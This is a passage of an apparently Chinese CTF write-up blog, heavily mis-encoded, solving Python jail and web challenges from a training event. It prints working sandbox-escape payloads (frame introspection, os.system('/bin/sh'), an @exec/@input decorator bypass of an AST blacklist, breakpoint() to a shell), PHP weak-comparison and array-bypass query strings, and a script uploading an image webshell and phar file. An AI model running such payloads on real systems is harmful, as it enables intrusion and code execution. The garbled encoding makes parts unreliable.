<p><strong>import</strong>(â€œsysâ€).<strong>stdout</strong>.write(str(<strong>import</strong>(â€˜sysâ€™)._getframe(1)))<br>
Welcome to my guesser game!<br>
Can u guess the number? between 1 and 9999999999999 &gt; <strong>import</strong>(â€œsysâ€).<strong>stdout</strong>.write(str(<strong>import</strong>(â€˜sysâ€™)._getframe(1)))<br>
Guess game end!!!<br>
è¿™é‡Œçš„frameå¯¹è±¡æŒ‡å‘äº†â€™/home/ctf/./server.pyâ€™è¿™ä¸ªfileï¼Œé‚£ä¹ˆç›´æ¥è°ƒç”¨f_localså±æ€§æŸ¥çœ‹å˜é‡</p>
<p><strong>import</strong>(â€œsysâ€).<strong>stdout</strong>.write(str(<strong>import</strong>(â€˜sysâ€™)._getframe(1).f_locals))</p>
<p>_</p>
<p><strong>import</strong>(â€œsysâ€).<strong>stdout</strong>.write(str(<strong>import</strong>(â€˜sysâ€™)._getframe(1).f_locals[â€œmy_lucky_numâ€]))</p>
<p>å•ç‹¬å–å‡ºå­—å…¸ä¸­å¯¹åº”å€¼</p>
<p>input_ex: [1, 2, 3, 4, 5]<br>
Can u guess the number? between 1 and 1000 &gt; <strong>import</strong>(â€œsysâ€).<strong>stdout</strong>.write(str(<strong>import</strong>(â€˜sysâ€™)._getframe(1).f_locals[â€œmy_lucky_numâ€]))<br>
[202, 653, 556, 715, 200]The correct number is: [202, 653, 556, 715, 200]<br>
Please try again if you really want to play that game.</p>
<p>â€‹</p>
<p>_â€˜<strong>import</strong>(â€œsysâ€).<strong>stdout</strong>.write(str(<strong>import</strong>('sys')._getframe(1).f_locals))â€™}The correct number is: [456, 787, 997, 625, 528]<br>
Please try again if you really want to play that game.]</p>
<p>str(<strong>import</strong>(â€˜sysâ€™)._getframe(1).f_locals[â€œmy_lucky_numâ€])</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">list</span><span class="hljs-params">(map(int, str(__import__(<span class="hljs-string">&#x27;sys&#x27;</span>)</span></span>.<span class="hljs-built_in">_getframe</span>(<span class="hljs-number">1</span>)<span class="hljs-selector-class">.f_locals</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;my_lucky_num&quot;</span>]</span>)))<br></code></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ç›´æ¥<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).<span class="hljs-built_in">_getframe</span>(<span class="hljs-number">1</span>)<span class="hljs-selector-class">.f_locals</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;my_lucky_num&quot;</span>]</span><br></code></pre></td></tr></table></figure>
<p>ç„¶åevalå°±è¡Œ</p>
<p>CBCTF{7df28655-3c0f-4ebe-985b-e18c60988982}</p>
<h6 id="pyjail8">pyjail8</h6>
<p>WELCOME = â€˜â€™â€™</p>
<hr>
<p>| |  | ____\ \  / / ____| |    ( _ )</p>
<p>| |  |  _|  \ \ / /|  _| | |    / _ \</p>
<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  | (_) |</p>
<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|  ___/</p>
<p>â€‹</p>
<p>â€˜â€™â€™</p>
<p>print WELCOME</p>
<p>print â€œWelcome to the python jailâ€</p>
<p>print â€œThis program will repeat your messagesâ€</p>
<p>input_data = input(&quot;&gt; &quot;)</p>
<p>print input_data</p>
<p>åœ¨Python 2.xç‰ˆæœ¬ä¸­ï¼Œå¯ä»¥ä½¿ç”¨printè¯­å¥è€Œä¸ä½¿ç”¨æ‹¬å·ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Hello, World!&quot;</span><br></code></pre></td></tr></table></figure>
<p>ä½†æ˜¯ï¼Œåœ¨Python 3.xåŠä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼Œprintè¢«æ”¹ä¸ºäº†ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨æ‹¬å·ã€‚å› æ­¤ï¼Œåœ¨Python 3.xåŠä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼Œå¿…é¡»ä½¿ç”¨æ‹¬å·æ¥è°ƒç”¨printå‡½æ•°ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello, World!&quot;</span>)</span></span><br></code></pre></td></tr></table></figure>
<p>è¯´æ˜å®ƒæ˜¯py2ç¯å¢ƒ</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†</p>
<p>py2ç¯å¢ƒä¸­æ˜æ˜æ²¡æœ‰input()ç”¨æ³•</p>
<p>ä¸ºä»€ä¹ˆä¼šå‡ºç°input()</p>
<p>åº”è¯¥æ˜¯raw_inputæ‰å¯¹</p>
<p>é‚£py2é‡Œçš„input()æ˜¯ä»€ä¹ˆæƒ…å†µ ä»€ä¹ˆç”¨æ³•?</p>
<p>æŸ¥å®˜ç½‘æ–‡æ¡£</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101111153757.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><code>eval()</code>å‡½æ•°å†…å¤„ç†çš„å‚æ•°æ˜¯å­—ç¬¦ä¸²ã€‚</p>
<p>raw_inputæŠŠæ‰€æœ‰è¾“å…¥ä½œä¸ºå­—ç¬¦ä¸²çœ‹å¾… è¿”å›å­—ç¬¦ä¸²ç±»å‹</p>
<p>**æ³¨æ„ï¼š**input() å’Œ raw_input() è¿™ä¸¤ä¸ªå‡½æ•°å‡èƒ½æ¥æ”¶ å­—ç¬¦ä¸² ï¼Œä½† raw_input()  ç›´æ¥è¯»å–æ§åˆ¶å°çš„è¾“å…¥ï¼ˆä»»ä½•ç±»å‹çš„è¾“å…¥å®ƒéƒ½å¯ä»¥æ¥æ”¶ï¼‰ã€‚è€Œå¯¹äº input() ï¼Œå®ƒå¸Œæœ›èƒ½å¤Ÿè¯»å–ä¸€ä¸ªåˆæ³•çš„ python  è¡¨è¾¾å¼ï¼Œå³ä½ è¾“å…¥å­—ç¬¦ä¸²çš„æ—¶å€™å¿…é¡»ä½¿ç”¨å¼•å·å°†å®ƒæ‹¬èµ·æ¥ï¼Œå¦åˆ™å®ƒä¼šå¼•å‘ä¸€ä¸ª SyntaxError ã€‚</p>
<p>input() äº§ç”Ÿæ¼æ´åŸå› </p>
<p>å‡½æ•°ä¼šå°† <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=stdin&amp;spm=1001.2101.3001.7020">stdin</a> è¾“å…¥çš„å†…å®¹å½“åšæ˜¯ python2 ä»£ç å»æ‰§è¡Œ</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101112344385.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>åˆ©ç”¨æ–¹å¼</p>
<pre><code class="hljs">å¦‚æœ python è„šæœ¬æœ¬èº«å°±æœ‰å¼•å…¥ os åº“ï¼Œè¾“å…¥ payload ç›´æ¥ getshellï¼š
</code></pre>
<p>os.system(â€˜/bin/shâ€™)</p>
<pre><code class="hljs">1

å¦‚æœ python è„šæœ¬æ²¡æœ‰å¼•å…¥ os åº“ï¼Œpayload å¦‚ä¸‹ï¼š
</code></pre>
<p><strong>import</strong>(â€˜osâ€™).system(â€˜/bin/shâ€™)<br>
ç›´æ¥å½“ä½œpy2ä»£ç æ‰§è¡Œäº†</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101112626332.png" srcset="/img/loading.gif" lazyload alt=""></p>
<hr>
<h6 id="pyjail9">pyjail9</h6>
<p>| |   | <em><strong><em>\ \   / / <strong><strong>| |      / _ \ <br>
| |   |  <em>|  \ \ / /|  <em>| | |     | (</em>) |<br>
| |</em></strong>| |</strong></em>  \ V / | |</strong></em>| |___   _<em>, |<br>
|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|    /</em>/</p>
<p>=================================================================================================<br>
==           Welcome to the JBNRZâ€™s pyjail level9,Itâ€™s AST challenge                       ==<br>
==           Menu list:                                                                        ==<br>
==             [G]et the blacklist AST                                                         ==<br>
==             [E]xecute the python code                                                       ==</p>
<p>==             [Q]uit jail challenge                                                           ==</p>
<p>=================================================================================================</p>
<p>G</p>
<p>==        Black List AST:                                                                      ==<br>
==                       'Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==</p>
<p>==                        Sub,Mult,Div,Delâ€™                                                    ==</p>
<p>AST æ²™ç®±ä¼šå°†ç”¨æˆ·çš„è¾“å…¥è½¬åŒ–ä¸ºæ“ä½œç ,æ­¤æ—¶å­—ç¬¦ä¸²å±‚é¢çš„å˜æ¢åŸºæœ¬ä¸Šæ²¡ç”¨äº†,ä¸€èˆ¬æƒ…å†µä¸‹è€ƒè™‘ç»•è¿‡ AST é»‘åå•.</p>
<p>å¦‚æœåŸºäº AST çš„æ²™ç®±é™åˆ¶äº†æ‰§è¡Œå‡½æ•°,é‚£ä¹ˆå°±éœ€è¦æ‰¾åˆ°ä¸€ç§ä¸éœ€è¦æ‰§è¡Œå‡½æ•°çš„æ–¹å¼æ‰§è¡Œç³»ç»Ÿå‘½ä»¤.</p>
<p>è£…é¥°å™¨</p>
<p>åˆ©ç”¨ payload å¦‚ä¸‹:</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@exec</span><br><span class="hljs-variable">@input</span><br>class <span class="hljs-attribute">X</span>:<br>    pass<br></code></pre></td></tr></table></figure>
<p>å½“æˆ‘ä»¬è¾“å…¥ä¸Šè¿°çš„ä»£ç å, Python ä¼šæ‰“å¼€è¾“å…¥,æ­¤æ—¶æˆ‘ä»¬å†è¾“å…¥ payload å°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>@<span class="hljs-built_in">exec</span><br><span class="hljs-meta">... </span>@<span class="hljs-built_in">input</span><br><span class="hljs-meta">... </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">X</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">pass</span><br><span class="hljs-meta">... </span><br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.X&#x27;</span>&gt;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;ls&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>ç”±äºè£…é¥°å™¨ä¸ä¼šè¢«è§£æä¸ºè°ƒç”¨è¡¨è¾¾å¼æˆ–è¯­å¥, å› æ­¤å¯ä»¥ç»•è¿‡é»‘åå•, æœ€ç»ˆä¼ å…¥çš„ payload æ˜¯ç”± input æ¥æ”¶çš„, å› æ­¤ä¹Ÿä¸ä¼šè¢«æ‹¦æˆª.</p>
<p>æˆ‘æ˜¯è¾¹å­¦è¾¹æ‰“çš„</p>
<p>æˆ‘ä¹‹å‰å¹¶ä¸äº†è§£AST</p>
<p>çœ‹åˆ°åæ²¡æ€è·¯æŸ¥äº†ä¸€ä¸‹ï¼Œ</p>
<p>çœ‹åˆ°æ€»ç»“å¦‚ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647#toc-40">https://xz.aliyun.com/t/12647#toc-40</a></p>
<p>![](file:///C:\Users\asus\Documents\Tencent Files\2104542143\nt_qq\nt_data\Pic\2024-01\Ori\952c7449fbc7c68b1193ced50bac7425.png)</p>
<p>![](file:///C:\Users\asus\Documents\Tencent Files\2104542143\nt_qq\nt_data\Pic\2024-01\Ori\565b192695893e163e74af0916f9bfe9.png)</p>
<h6 id="pyjail10">pyjail10</h6>
<p>def repl():</p>
<p>my_global_dict = dict()</p>
<p>my_global_dict[â€˜flagâ€™] = load_flag.get_flag()</p>
<p>input_code = input(&quot;&gt; &quot;)</p>
<p>complie_code = compile(input_code, â€˜<string>â€™, â€˜singleâ€™)</p>
<p>exec(complie_code, my_global_dict)</p>
<p>if <strong>name</strong> == â€˜<strong>main</strong>â€™:</p>
<p>main()</p>
<p>æˆ‘çš„å¥½æœ‹å‹GPT</p>
<p>è¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ªç®€å•çš„ REPLï¼ˆRead-Eval-Print Loopï¼‰ç¯å¢ƒï¼Œå…¶ä¸­ï¼š</p>
<ol>
<li><code>my_global_dict</code> æ˜¯ä¸€ä¸ªåŒ…å«å…¨å±€å˜é‡çš„å­—å…¸ï¼Œ<code>flag</code> æ˜¯å…¶ä¸­ä¸€ä¸ªå˜é‡ï¼Œå®ƒçš„å€¼æ˜¯é€šè¿‡ <code>load_flag.get_flag()</code> å‡½æ•°è·å–çš„ã€‚åœ¨ REPL ä¸­è¾“å…¥çš„ä»£ç å¯ä»¥è®¿é—®å’Œä¿®æ”¹è¿™ä¸ªå­—å…¸ä¸­çš„å˜é‡ã€‚</li>
<li><code>input_code</code> ç”¨äºæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„ä»£ç å­—ç¬¦ä¸²ã€‚</li>
<li><code>compile</code> å‡½æ•°å°† <code>input_code</code> ç¼–è¯‘æˆå¯æ‰§è¡Œçš„å­—èŠ‚ç å¯¹è±¡ï¼Œ<code>'&lt;string&gt;'</code> å‚æ•°è¡¨ç¤ºç¼–è¯‘çš„ä»£ç æ¥è‡ªä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ<code>'single'</code> å‚æ•°è¡¨ç¤ºç¼–è¯‘çš„ä»£ç åªåŒ…å«ä¸€æ¡è¯­å¥ã€‚</li>
<li><code>exec</code> å‡½æ•°æ‰§è¡Œç¼–è¯‘åçš„å­—èŠ‚ç ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨ <code>my_global_dict</code> ä¸­ã€‚ç”±äºç¼–è¯‘çš„ä»£ç åªåŒ…å«ä¸€æ¡è¯­å¥ï¼Œå› æ­¤æ¯æ¬¡æ‰§è¡Œçš„ç»“æœåªä¼šè¿”å›ä¸€è¡Œè¾“å‡ºã€‚</li>
</ol>
<p>è¿™ä¸ª REPL ç¯å¢ƒå¯ä»¥è®©ç”¨æˆ·è¾“å…¥ Python ä»£ç ï¼Œå¹¶ç«‹å³æ‰§è¡Œã€‚ç”¨æˆ·å¯ä»¥è®¿é—®å¹¶ä¿®æ”¹ <code>my_global_dict</code> ä¸­çš„å˜é‡ï¼Œä½†éœ€è¦æ³¨æ„ä¸è¦ä¿®æ”¹æ•æ„Ÿçš„å˜é‡æˆ–æ‰§è¡Œå±é™©çš„æ“ä½œï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„åæœã€‚</p>
<p><code>dir()</code> æ˜¯ Python å†…ç½®å‡½æ•°ï¼Œç”¨äºåˆ—å‡ºå½“å‰å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰å˜é‡ã€å‡½æ•°å’Œç±»ç­‰å¯¹è±¡</p>
<p>[â€˜<strong>builtins</strong>â€™, â€˜flagâ€™]</p>
<p>åœ¨ Python ä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å˜é‡åæ¥æŸ¥çœ‹å˜é‡çš„å€¼</p>
<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">flag</span><br></code></pre></td></tr></table></figure>
<p>&lt;load_flag.flag_level10 object at 0x7febd3722eb0&gt;</p>
<p>ä½¿ç”¨å†…ç½®å‡½æ•° <code>dir()</code> æ¥åˆ—å‡ºå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">dir</span>(flag)</span><br></code></pre></td></tr></table></figure>
<p>è¿™æ ·å¯ä»¥å¸®åŠ©ä½ äº†è§£ <code>flag</code> å¯¹è±¡çš„ç»“æ„å’Œå¯ç”¨çš„æ“ä½œ</p>
<p>[â€˜<strong>class</strong>â€™, â€˜<strong>delattr</strong>â€™, â€˜<strong>dict</strong>â€™, â€˜<strong>dir</strong>â€™, â€˜<strong>doc</strong>â€™, â€˜<strong>eq</strong>â€™, â€˜<strong>format</strong>â€™, â€˜<strong>ge</strong>â€™, â€˜<strong>getattribute</strong>â€™, â€˜<strong>gt</strong>â€™, â€˜<strong>hash</strong>â€™, â€˜<strong>init</strong>â€™, â€˜<strong>init_subclass</strong>â€™, â€˜<strong>le</strong>â€™, â€˜<strong>lt</strong>â€™, â€˜<strong>module</strong>â€™, â€˜<strong>ne</strong>â€™, â€˜<strong>new</strong>â€™, â€˜<strong>reduce</strong>â€™, â€˜<strong>reduce_ex</strong>â€™, â€˜<strong>repr</strong>â€™, â€˜<strong>setattr</strong>â€™, â€˜<strong>sizeof</strong>â€™, â€˜<strong>str</strong>â€™, â€˜<strong>subclasshook</strong>â€™, â€˜<strong>weakref</strong>â€™, â€˜flag_level10â€™]</p>
<p>è¿™ä¸ªè¾“å‡ºæ„å‘³ç€ flag å˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡</p>
<p>ä½ å¯ä»¥ä½¿ç”¨ç‚¹è¿ç®—ç¬¦æ¥è®¿é—®è¿™ä¸ªå±æ€§çš„å€¼ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">flag.flag_level10</span><br></code></pre></td></tr></table></figure>
<blockquote>
<p>flag.flag_level10<br>
DELETED</p>
</blockquote>
<p>?</p>
<p>å˜¶</p>
<p>ä¸æ‡‚ï¼Œä½†æ˜¯å®ƒå¥½åƒå¯ä»¥æ­£å¸¸æ‰§è¡Œæˆ‘çš„ä»£ç </p>
<p>input_code = input(&quot;&gt; &quot;)</p>
<p>complie_code = compile(input_code, â€˜<string>â€™, â€˜singleâ€™)</p>
<p>exec(complie_code, my_global_dict)</p>
<p>ç¼–è¯‘äº†ä¹Ÿç…§æ ·èƒ½æ‰§è¡Œå‘€</p>
<p>è¿™ä¸æœ‰execä¹ˆ</p>
<p>é‚£æˆ‘ç›´æ¥ä¸€æ‰‹breakpoint</p>
<p>nc training.0rays.club 10077</p>
<hr>
<p>| |   | <em><em><strong>\ \   / / <em><strong><em>| |     / |/ _ \ <br>
| |   |  <em>|  \ \ / /|  <em>| | |     | | | | |<br>
| |</em></em></em>| |</strong></em>  \ V / | |</strong></em>| |</em>__  | | |<em>| |<br>
|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>| |</em>|___/</p>
<p>Itâ€™s so easy challenge!<br>
Seems flag into the dir()</p>
<blockquote>
<p>breakpoint()<br>
â€“Returnâ€“<br>
<string>(1)<module>()-&gt;None<br>
(Pdb) ls<br>
*** NameError: name â€˜lsâ€™ is not defined<br>
(Pdb) dir<br>
<built-in function dir><br>
(Pdb) <strong>import</strong>(â€œosâ€).system(â€œlsâ€)<br>
bin<br>
boot<br>
dev<br>
etc<br>
flag<br>
home<br>
lib<br>
lib32<br>
lib64<br>
libx32<br>
media<br>
mnt<br>
opt<br>
proc<br>
root<br>
run<br>
sbin<br>
srv<br>
<a target="_blank" rel="noopener" href="http://start.sh">start.sh</a><br>
sys<br>
tmp<br>
usr<br>
var<br>
0<br>
(Pdb) cat flag<br>
*** SyntaxError: invalid syntax<br>
(Pdb) cat /flag<br>
*** NameError: name â€˜catâ€™ is not defined<br>
(Pdb) <strong>import</strong>(â€œosâ€).system(â€œcat flagâ€)<br>
CBCTF{30df3e3f-9fe5-4b4e-9824-fdf3a0885fae}<br>
0<br>
(Pdb)</p>
</blockquote>
<h5 id="WEB">WEB</h5>
<h6 id="Another-Signin">Another_Signin</h6>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231011440323.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>HINTï¼šåŸŸåã€DNSå’ŒTXT</p>
<ol>
<li>DNSè§£æï¼šä½¿ç”¨ DNS å·¥å…·ï¼ˆä¾‹å¦‚<code>nslookup</code>æˆ–<code>dig</code>ï¼‰ï¼ŒæŸ¥æ‰¾è¯¥åŸŸåçš„ DNS è®°å½•ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š<code>nslookup game.0rays.club</code> æˆ– <code>dig game.0rays.club</code>ã€‚è¿™å°†è¿”å›ä¸è¯¥åŸŸåç›¸å…³çš„è®°å½•ï¼ŒåŒ…æ‹¬ IP åœ°å€ã€NSï¼ˆName Serversï¼‰å’Œå…¶ä»–è®°å½•ã€‚</li>
<li>TXTè®°å½•ï¼šæ£€æŸ¥åŸŸåçš„ TXT è®°å½•ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š<code>nslookup -type=TXT game.0rays.club</code> æˆ– <code>dig TXT game.0rays.club</code>ã€‚è¿™å°†æ˜¾ç¤ºä¸è¯¥åŸŸåç›¸å…³çš„ä»»ä½• TXT è®°å½•ã€‚TXT è®°å½•é€šå¸¸ç”¨äºå­˜å‚¨æ–‡æœ¬ä¿¡æ¯ã€‚</li>
</ol>
<h6 id="beginnerTETRis">beginnerTETRis</h6>
<p>çœ‹js å®¡è®¡</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230094016989.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230094025074.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ä¸¤æ®µbase</p>
<p>ä¸€æŠŠæ¢­ æ‹¼èµ·æ¥</p>
<p>è§£å¯†å¾—flag</p>
<h6 id="ezphp">ezphp</h6>
<p>The page you visit not found.</p>
<p>Sorry, the page you are looking for is currently unavailable.<br>
Please try again later.</p>
<p>The server is powered by <a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a>.</p>
<p><em>Faithfully yours, frp.</em></p>
<p>â€‹                              å¼±å£ä»¤é¥¶å¼±æ¯”è¾ƒ   å†æ•°ç»„ç»•è¿‡arrayå¼±æ¯”è¾ƒ</p>
<p>?orz=1&amp;jbn1=QNKCDZO&amp;jbn2=240610708&amp;username=0rays&amp;password=Array[]</p>
<p>æ•°ç»„ç»•è¿‡</p>
<p>?orz=1&amp;jbn1=QNKCDZO&amp;jbn2=240610708&amp;username=0rays&amp;password[]=Array</p>
<p>è‡ªå·±å†™ä¸Šä¼ è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://2e4fa042-edc8-465d-aa17-f1706abbc8ab.training.0rays.club:8001/&#x27;</span> <br><br><span class="hljs-comment">#file_path = &#x27;D:\skyDownloads\Software\skysoftware\Orays\Web\SkyScript\å›¾ç‰‡é©¬\Ak.jpg&#x27;#upload/20231231063324776.jpg</span><br>file_path = <span class="hljs-string">&#x27;D:\skyDownloads\Software\skysoftware\Orays\Web\SkyScript\ååºåˆ—åŒ–\pharååºåˆ—åŒ–\phar.jpg&#x27;</span>  <br><span class="hljs-comment">#file_path = &#x27;D:\skyDownloads\Software\skysoftware\Orays\Web\SkyScript\æ–‡ä»¶é©¬\post.php.jpg&#x27;#upload/20231231070253652.jpg</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: file&#125;<br>    response = requests.post(url, files=files)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æœåŠ¡å™¨è¿”å›çš„å“åº”ç»“æœï¼š&#x27;</span>, response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;é”™è¯¯ä¿¡æ¯ï¼š&#x27;</span>, response.text)<br></code></pre></td></tr></table></figure>
<p>PS C:\Users\asus&gt; python -u â€œd:\skyDownloads\Software\skysoftware\Orays\python\skyè„šæœ¬\æ–‡ä»¶ä¸Šä¼ \upload.pyâ€<br>
æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼<br>
æœåŠ¡å™¨è¿”å›çš„å“åº”ç»“æœï¼š success save in: upload/20231231004401117.jpg</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231084554889.png" srcset="/img/loading.gif" lazyload alt="image-20231231084554889"></p>
<p>æ¥ä¸‹æ¥èƒ½ä¸Šä¼ äº†ï¼Œä¸Šä¼ çš„é—®é¢˜è§£å†³åæˆ‘ä»¬å†çœ‹å…¶å®ƒçš„åŠæ³•</p>
<p>å› ä¸ºåå°è¿‡æ»¤æ¯”è¾ƒä¸¥æ ¼ï¼Œåªèƒ½ä¼ å›¾ç‰‡ï¼Œè¿™å°±æ„å‘³ç€æ™®é€šçš„æ–‡ä»¶é©¬ä¸Šä¼ äº†ä¹Ÿæ‰“ä¸äº†ï¼Œä½†æ˜¯å›¾ç‰‡é©¬ç»è¿‡æ–‡ä»¶åŒ…å«å‡½æ•°åæ˜¯å¯ä»¥åˆ©ç”¨çš„</p>
<p>è¿™é‡Œçœ‹åˆ°ä¸‹é¢çš„  include($this-&gt;checkAccess);  é‚£è‚¯å®šæ˜¯è¦æ„é€ ä¸€ä¸‹ï¼Œç„¶åæŠŠæˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡é©¬åŒ…å«è¿›å»è§£ææ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 